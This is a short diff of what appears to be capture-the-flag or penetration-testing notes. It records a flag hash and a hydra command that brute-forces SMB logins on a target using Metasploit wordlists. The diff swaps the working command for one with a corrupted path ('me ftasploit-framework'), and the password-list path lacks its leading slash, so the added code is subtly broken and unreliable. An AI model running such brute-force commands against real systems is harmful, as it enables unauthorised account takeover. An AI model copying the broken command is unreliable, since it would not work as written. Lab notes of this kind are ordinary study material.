@@ -336,7 +336,7 @@ flag: eb09cc6f1cd72756da145892892fbf5a
 Default attack:  Bruteforce with hydra
 Script:
 ```bash
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/common_passwords.txt $ip smb
+hydra -L /usr/share/me ftasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/common_passwords.txt $ip smb
 ```
 
 Other utitiliy for exploiting smb is
